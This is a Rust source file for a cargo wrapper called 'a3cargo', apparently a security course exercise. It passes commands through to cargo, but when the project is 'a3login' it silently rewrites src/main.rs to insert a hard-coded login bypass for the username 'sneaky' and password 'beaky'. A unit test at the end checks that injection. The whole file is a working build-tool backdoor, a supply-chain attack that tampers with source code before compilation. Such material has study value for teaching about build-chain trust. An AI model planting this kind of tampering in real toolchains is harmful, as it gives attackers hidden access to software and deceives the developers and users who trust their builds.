use std::env;
use std::fs;
use std::process::Command;
use std::io::{self, Write};

fn main() {
    let args: Vec<String> = env::args().collect();
    if args.len() < 2 {
        eprintln!("Usage: a3cargo <build|run> [<args>...]");
        std::process::exit(1);
    }

    let cargo_command = &args[1];

    // Determine if the current project is a3login by checking Cargo.toml
    let is_a3login = match fs::read_to_string("Cargo.toml") {
        Ok(contents) => contents.contains("a3login"),
        Err(err) => {
            eprintln!("Error reading Cargo.toml: {}", err);
            false
        }
    };

    if is_a3login {
        println!("Detected a3login project.");
        // Modify a3login source code to accept sneaky as a username and beaky as a password
        match modify_a3login_source_code() {
            Ok(_) => println!("Modified a3login source code successfully."),
            Err(err) => eprintln!("Error modifying a3login source code: {}", err),
        }
    } else {
        println!("Not an a3login project.");
    }

    // Execute the original cargo command
    let status = Command::new("cargo")
        .arg(cargo_command)
        .args(&args[2..])
        .status()
        .expect("Failed to execute cargo command");

    std::process::exit(status.code().unwrap_or_default());
}

fn modify_a3login_source_code() -> Result<(), io::Error> {
    let original_code = fs::read_to_string("src/main.rs")?;

    let modified_code = original_code.replace(
        "fn main() {",
        "fn main() {
    let args: Vec<String> = std::env::args().collect();
    if args.len() >= 3 && args[1] == \"sneaky\" && args[2] == \"beaky\" {
        println!(\"Access granted!\");
        std::process::exit(0);
    }
");

    fs::write("src/main.rs", &modified_code)?;

    Ok(())
}


#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;

    #[test]
    fn test_modify_a3login_source_code() {
        let original_contents = r#"
fn main() {
    println!("Access granted!");
}
"#;
        let expected_contents = r#"
fn main() {
    let args: Vec<String> = std::env::args().collect();
    if args.len() >= 3 && args[1] == "sneaky" && args[2] == "beaky" {
        println!("Access granted!");
        std::process::exit(0);
    }

    println!("Access granted!");
}
"#;

        fs::write("src/main.rs", original_contents).expect("Failed to write original code");

        modify_a3login_source_code();

        let modified_contents = fs::read_to_string("src/main.rs").expect("Failed to read modified code");
        
        assert_eq!(modified_contents, expected_contents);
    }
}

